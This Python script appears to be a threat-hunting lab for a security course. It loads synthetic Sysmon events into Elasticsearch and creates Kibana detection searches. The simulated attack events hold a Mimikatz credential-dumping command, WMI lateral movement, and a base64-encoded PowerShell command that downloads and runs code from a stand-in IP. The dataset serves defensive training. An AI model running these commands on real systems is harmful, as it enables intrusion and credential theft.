#!/usr/bin/env python3
"""
load_sysmon_hunting.py - Genera y carga dataset de Sysmon para hunting en ELK
Incluye: Mimikatz, PowerShell encoded, WMI lateral, Registry persistence
Curso MAR404 - Clase 8 - Lab 15
"""
import json, time, random, hashlib
from datetime import datetime, timedelta
from elasticsearch import Elasticsearch

ES_HOST = "http://elasticsearch:9200"
INDEX = "sysmon-hunting"

def wait_for_es():
    es = Elasticsearch(ES_HOST)
    for i in range(60):
        try:
            if es.ping(): return es
        except: pass
        time.sleep(2)
    raise Exception("ES not available")

def generate_sysmon_events():
    base_time = datetime(2025, 7, 20, 8, 0, 0)
    events = []
    
    # Normal activity (400 events)
    normal_procs = [
        ("explorer.exe", "C:\\Windows\\explorer.exe", "CORP\\user01", 2400),
        ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe", "CORP\\user01", 5500),
        ("outlook.exe", "C:\\Program Files\\Microsoft Office\\Outlook.exe", "CORP\\user01", 3200),
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "NT AUTHORITY\\SYSTEM", 800),
        ("notepad.exe", "C:\\Windows\\System32\\notepad.exe", "CORP\\user01", 6000),
    ]
    
    for i in range(400):
        proc = random.choice(normal_procs)
        t = base_time + timedelta(minutes=random.randint(0, 480))
        events.append({
            "event_id": 1, "timestamp": t.isoformat(),
            "process_name": proc[0], "image": proc[1],
            "user": proc[2], "pid": proc[3] + random.randint(0, 100),
            "parent_image": "C:\\Windows\\explorer.exe",
            "command_line": proc[1],
            "hashes": f"SHA256={hashlib.sha256(proc[0].encode()).hexdigest()}",
            "category": "normal", "severity": "info"
        })
    
    # === MALICIOUS EVENTS ===
    attack_time = base_time + timedelta(hours=2, minutes=30)
    
    # 1. Mimikatz - Process Access to LSASS (Event ID 10)
    events.append({
        "event_id": 10, "timestamp": attack_time.isoformat(),
        "source_image": "C:\\Users\\admin\\Desktop\\m.exe",
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "granted_access": "0x1010", "user": "CORP\\admin",
        "call_trace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9C4C4|C:\\Users\\admin\\Desktop\\m.exe+6DC0",
        "category": "credential_access", "severity": "critical",
        "mitre": "T1003.001", "hunt_note": "Process access to lsass with 0x1010 = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ"
    })
    
    # 2. Mimikatz execution (Event ID 1)
    events.append({
        "event_id": 1, "timestamp": (attack_time - timedelta(seconds=5)).isoformat(),
        "process_name": "m.exe", "image": "C:\\Users\\admin\\Desktop\\m.exe",
        "user": "CORP\\admin", "pid": 7788,
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "m.exe sekurlsa::logonpasswords",
        "hashes": "SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "category": "credential_access", "severity": "critical",
        "mitre": "T1003.001"
    })
    
    # 3. PowerShell Encoded (Event ID 1)
    events.append({
        "event_id": 1, "timestamp": (attack_time + timedelta(minutes=5)).isoformat(),
        "process_name": "powershell.exe", "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "user": "CORP\\admin", "pid": 8100,
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADEAMAAvAHMAaABlAGwAbABjAG8AZABlACcAKQA=",
        "hashes": "SHA256=de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
        "category": "execution", "severity": "critical",
        "mitre": "T1059.001"
    })
    
    # 4. Network connection to C2 (Event ID 3)
    events.append({
        "event_id": 3, "timestamp": (attack_time + timedelta(minutes=6)).isoformat(),
        "process_name": "powershell.exe", "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "user": "CORP\\admin", "pid": 8100,
        "destination_ip": "198.51.100.10", "destination_port": 443,
        "source_ip": "10.0.1.50", "source_port": 49832,
        "protocol": "tcp",
        "category": "c2", "severity": "critical",
        "mitre": "T1071.001"
    })
    
    # 5. WMI Lateral Movement (Event ID 1)
    events.append({
        "event_id": 1, "timestamp": (attack_time + timedelta(minutes=15)).isoformat(),
        "process_name": "wmic.exe", "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
        "user": "CORP\\admin", "pid": 8500,
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "wmic /node:10.0.1.100 process call create \"powershell -enc ...\"",
        "category": "lateral_movement", "severity": "high",
        "mitre": "T1047"
    })
    
    # 6. Registry persistence (Event ID 13)
    events.append({
        "event_id": 13, "timestamp": (attack_time + timedelta(minutes=20)).isoformat(),
        "process_name": "powershell.exe", "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "user": "CORP\\admin", "pid": 8100,
        "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
        "details": "C:\\Windows\\Temp\\svchost.exe",
        "event_type": "SetValue",
        "category": "persistence", "severity": "high",
        "mitre": "T1547.001"
    })
    
    # 7. CreateRemoteThread (Event ID 8)
    events.append({
        "event_id": 8, "timestamp": (attack_time + timedelta(minutes=25)).isoformat(),
        "source_image": "C:\\Windows\\Temp\\svchost.exe",
        "target_image": "C:\\Windows\\System32\\svchost.exe",
        "source_pid": 9000, "target_pid": 800,
        "start_address": "0x7FFE30001000",
        "user": "CORP\\admin",
        "category": "injection", "severity": "critical",
        "mitre": "T1055.001"
    })
    
    # 8. DNS query to DGA domain (Event ID 22)
    events.append({
        "event_id": 22, "timestamp": (attack_time + timedelta(minutes=30)).isoformat(),
        "process_name": "svchost.exe", "image": "C:\\Windows\\Temp\\svchost.exe",
        "query_name": "xk7f9a2bm3.evil-domain.com",
        "query_results": "198.51.100.50",
        "user": "CORP\\admin", "pid": 9000,
        "category": "c2", "severity": "high",
        "mitre": "T1568.002"
    })
    
    # Add 50 more normal DNS queries
    normal_domains = ["google.com", "microsoft.com", "office365.com", "github.com", "cdn.cloudflare.com"]
    for i in range(50):
        t = base_time + timedelta(minutes=random.randint(0, 480))
        events.append({
            "event_id": 22, "timestamp": t.isoformat(),
            "process_name": "chrome.exe", "image": "C:\\Program Files\\Google\\Chrome\\chrome.exe",
            "query_name": random.choice(normal_domains),
            "query_results": f"142.250.{random.randint(1,255)}.{random.randint(1,255)}",
            "user": "CORP\\user01", "pid": 5500,
            "category": "normal", "severity": "info"
        })
    
    return events

def create_visualizations(es):
    """Crea visualizaciones y dashboard usando Kibana Saved Objects API."""
    import requests
    kibana_url = "http://sysmon-kibana:5601"
    
    # Wait for Kibana
    for i in range(60):
        try:
            r = requests.get(f"{kibana_url}/api/status")
            if r.status_code == 200: break
        except: pass
        time.sleep(3)
    
    headers = {"kbn-xsrf": "true", "Content-Type": "application/json"}
    
    # Create data view
    requests.post(f"{kibana_url}/api/data_views/data_view", headers=headers, json={
        "data_view": {"title": "sysmon-hunting*", "name": "Sysmon Hunting", "timeFieldName": "timestamp"}
    })
    
    # Create saved searches for hunting
    saved_objects = [
        {"type": "search", "id": "hunt-mimikatz", "attributes": {
            "title": "HUNT: Mimikatz - LSASS Access",
            "description": "Detecta acceso a lsass.exe (T1003.001)",
            "kibanaSavedObjectMeta": {"searchSourceJSON": json.dumps({
                "query": {"query": "event_id:10 AND target_image:*lsass*", "language": "kuery"},
                "filter": [], "indexRefName": "kibanaSavedObjectMeta.searchSourceJSON.index"
            })}
        }},
        {"type": "search", "id": "hunt-powershell-enc", "attributes": {
            "title": "HUNT: PowerShell Encoded Commands",
            "description": "Detecta PowerShell con -enc flag (T1059.001)",
            "kibanaSavedObjectMeta": {"searchSourceJSON": json.dumps({
                "query": {"query": "command_line:*-enc* OR command_line:*-encoded*", "language": "kuery"},
                "filter": [], "indexRefName": "kibanaSavedObjectMeta.searchSourceJSON.index"
            })}
        }},
        {"type": "search", "id": "hunt-remote-thread", "attributes": {
            "title": "HUNT: CreateRemoteThread",
            "description": "Detecta inyección via CreateRemoteThread (T1055)",
            "kibanaSavedObjectMeta": {"searchSourceJSON": json.dumps({
                "query": {"query": "event_id:8", "language": "kuery"},
                "filter": [], "indexRefName": "kibanaSavedObjectMeta.searchSourceJSON.index"
            })}
        }},
        {"type": "search", "id": "hunt-registry-run", "attributes": {
            "title": "HUNT: Registry Run Key Persistence",
            "description": "Detecta persistencia via Run keys (T1547.001)",
            "kibanaSavedObjectMeta": {"searchSourceJSON": json.dumps({
                "query": {"query": "event_id:13 AND target_object:*CurrentVersion\\\\Run*", "language": "kuery"},
                "filter": [], "indexRefName": "kibanaSavedObjectMeta.searchSourceJSON.index"
            })}
        }},
    ]
    
    try:
        requests.post(f"{kibana_url}/api/saved_objects/_bulk_create?overwrite=true",
                     headers=headers, json=saved_objects)
    except: pass

def main():
    es = wait_for_es()
    
    # Create index with mapping
    mapping = {
        "mappings": {
            "properties": {
                "timestamp": {"type": "date"},
                "event_id": {"type": "integer"},
                "process_name": {"type": "keyword"},
                "image": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "user": {"type": "keyword"},
                "pid": {"type": "integer"},
                "parent_image": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "command_line": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "category": {"type": "keyword"},
                "severity": {"type": "keyword"},
                "mitre": {"type": "keyword"},
                "destination_ip": {"type": "ip"},
                "destination_port": {"type": "integer"},
                "source_image": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "target_image": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "target_object": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "query_name": {"type": "keyword"},
            }
        }
    }
    
    es.indices.delete(index=INDEX, ignore=[404])
    es.indices.create(index=INDEX, body=mapping)
    
    events = generate_sysmon_events()
    for event in events:
        es.index(index=INDEX, document=event)
    
    es.indices.refresh(index=INDEX)
    print(f"[+] Loaded {len(events)} Sysmon events into '{INDEX}'")
    print(f"[+] Malicious events: {sum(1 for e in events if e.get('severity') in ('critical','high'))}")
    
    create_visualizations(es)
    print("[+] Kibana saved searches created")
    print("[+] Access Kibana at http://localhost:5601")

if __name__ == "__main__":
    main()
